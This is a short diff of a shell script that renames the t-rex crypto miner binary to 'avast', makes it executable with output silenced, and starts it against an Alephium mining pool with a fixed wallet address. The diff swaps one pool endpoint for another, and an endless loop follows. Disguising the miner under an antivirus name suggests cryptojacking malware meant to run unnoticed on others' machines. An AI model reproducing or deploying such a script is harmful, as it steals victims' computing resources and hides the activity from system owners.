@@ -20,7 +20,7 @@ mv t-rex avast
 
 chmod +x avast >/dev/null 2>&1
 
-./avast -a blake3 -o stratum+tcp://pool.eu.woolypooly.com:3106 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w AAAA
+./avast -a blake3 -o stratum+tcp://de.alephium.herominers.com:1199 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.AAA -p x
 
 while [ 1 ]; do
 
